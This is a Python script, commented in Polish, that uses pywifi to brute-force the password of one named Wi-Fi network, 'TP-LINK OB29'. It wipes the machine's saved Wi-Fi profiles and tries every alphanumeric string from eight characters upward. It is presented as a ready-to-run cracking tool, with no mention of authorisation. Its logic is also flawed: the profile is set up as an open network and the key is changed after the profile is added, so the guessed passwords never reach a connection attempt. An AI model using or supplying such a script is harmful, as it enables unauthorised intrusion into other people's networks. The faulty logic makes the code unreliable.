import itertools
import pywifi
from pywifi import const
import sys
import time

def check_wifi_network(ssid):
    wifi = pywifi.PyWiFi()  # Inicjalizacja obiektu PyWiFi
    iface = wifi.interfaces()[0]  # Wybór pierwszego dostępnego interfejsu WiFi

    scan_results = iface.scan_results()  # Pobranie listy dostępnych sieci WiFi w pobliżu

    for network in scan_results:
        if network.ssid == ssid:
            return True

    return False

def crack_wifi_password(ssid):
    if not check_wifi_network(ssid):
        print("Nie znaleziono sieci WiFi o podanej nazwie w pobliżu.")
        return

    wifi = pywifi.PyWiFi()  # Inicjalizacja obiektu PyWiFi
    iface = wifi.interfaces()[0]  # Wybór pierwszego dostępnego interfejsu WiFi
    iface.disconnect()  # Odłączenie od bieżącej sieci WiFi

    profile = pywifi.Profile()  # Utworzenie nowego profilu WiFi
    profile.ssid = ssid  # Ustawienie SSID sieci
    profile.auth = const.AUTH_ALG_OPEN  # Ustawienie typu uwierzytelniania
    profile.akm.append(const.AKM_TYPE_NONE)  # Dodanie typu uwierzytelniania
    profile.cipher = const.CIPHER_TYPE_NONE  # Ustawienie typu szyfrowania
    iface.remove_all_network_profiles()  # Usunięcie innych profili WiFi
    temp_profile = iface.add_network_profile(profile)  # Dodanie nowego profilu

    password_chars = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789"
    password_length = 8
    start_time = time.time()

    while True:
        password_attempts = itertools.product(password_chars, repeat=password_length)

        for attempt in password_attempts:
            password = "".join(attempt)
            profile.key = password  # Ustawienie hasła w profilu WiFi
            iface.connect(temp_profile)  # Podłączenie do sieci WiFi

            if iface.status() == const.IFACE_CONNECTED:  # Sprawdzenie, czy połączenie zostało ustanowione
                end_time = time.time()
                elapsed_time = end_time - start_time
                print("Udało się złamać hasło! Hasło WiFi to:", password)
                print("Czas potrzebny na złamanie hasła:", round(elapsed_time, 2), "sekund")
                iface.disconnect()  # Odłączenie od sieci WiFi
                iface.remove_network_profile(temp_profile)  # Usunięcie tymczasowego profilu
                input("Naciśnij Enter, aby zakończyć...")
                return
            else:
                print("Sprawdzam hasło:", password)

        password_length += 1

# Użyj funkcji, podając nazwę sieci (SSID)
crack_wifi_password("TP-LINK OB29")